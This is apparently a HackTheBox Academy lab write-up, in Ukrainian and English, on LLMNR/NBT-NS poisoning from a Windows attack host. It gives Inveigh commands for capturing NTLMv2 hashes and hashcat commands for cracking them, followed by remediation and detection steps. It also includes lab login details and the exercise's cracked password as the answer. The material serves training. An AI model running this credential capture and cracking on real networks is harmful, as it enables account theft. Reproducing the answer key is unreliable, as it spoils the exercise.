# LLMNR/NBT-NS Poisoning - from Windows

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1420](https://academy.hackthebox.com/app/module/143/section/1420) |

---

## 🧠 Теорія

Якщо attack host — Windows, замість Responder використовується **Inveigh**.
Написаний на PowerShell (legacy) та C# (актуальна версія — InveighZero).

Підтримувані протоколи: `LLMNR · DNS · mDNS · NBNS · DHCPv6 · ICMPv6 · HTTP · HTTPS · SMB · LDAP · WebDAV · Proxy Auth`

Інструмент знаходиться на attack host за шляхом: `C:\Tools`

---

## 🔑 Ключові команди

### PowerShell версія (Inveigh.ps1)

```powershell
# Імпорт модуля
Import-Module .\Inveigh.ps1

# Запуск з LLMNR + NBNS + вивід в консоль і файл
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C# версія (InveighZero — рекомендована)

```powershell
# Запуск з дефолтними налаштуваннями
.\Inveigh.exe
```

### Інтерактивна консоль (під час роботи Inveigh.exe)

```
# Натиснути ESC → відкриється консоль

HELP                  # список команд
GET NTLMV2UNIQUE      # унікальні NTLMv2 хеші
GET NTLMV2USERNAMES   # usernames + source IP
GET CLEARTEXT         # cleartext credentials (якщо є)
STOP                  # зупинити Inveigh
```

### Крекінг захопленого хешу (на Linux/Pwnbox)

```bash
# Скопіювати хеш з виводу Inveigh у файл
# Запустити hashcat
hashcat -m 5600 hash_svc_qualys.txt /usr/share/wordlists/rockyou.txt
```

---

## 🛡️ Remediation

| Захід | Як виконати |
|-------|-------------|
| Вимкнути LLMNR | GPO → Computer Config → Admin Templates → Network → DNS Client → **Turn off multicast name resolution** |
| Вимкнути NBT-NS | Network adapter → TCP/IPv4 → Advanced → WINS → **Disable NetBIOS over TCP/IP** |
| Вимкнути NBT-NS через GPO (скрипт) | Startup PowerShell script через GPO на SYSVOL |
| Увімкнути SMB Signing | Запобігає NTLM Relay атакам |

```powershell
# GPO PowerShell скрипт для вимкнення NBT-NS на всіх хостах
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

## 🔍 Detection

| Метод | Опис |
|-------|------|
| Моніторинг портів | UDP 5355 (LLMNR), UDP 137 (NBT-NS) |
| Event IDs | 4697, 7045 |
| Registry | `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` → `EnableMulticast = 0` |
| Honeypot queries | Надсилати фейкові LLMNR запити — якщо хтось відповідає, є attacker |

---

## ❓ Questions

### Q1 — Пароль svc_qualys

> **Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.**

**Steps:**

```powershell
# 1. RDP до Windows attack host
# IP: ACADEMY-EA-MS01 | user: htb-student | pass: Academy_student_AD!

# 2. Відкрити PowerShell від імені адміна та запустити Inveigh
cd C:\Tools
.\Inveigh.exe

# 3. Чекати — через кілька хвилин з'явиться хеш svc_qualys
# Натиснути ESC → ввести:
GET NTLMV2USERNAMES     # переконатись що svc_qualys є
GET NTLMV2UNIQUE        # скопіювати хеш svc_qualys

# 4. Перенести хеш на Linux/Pwnbox та зламати
hashcat -m 5600 hash_svc_qualys.txt /usr/share/wordlists/rockyou.txt
```

**Answer:** `security#1`
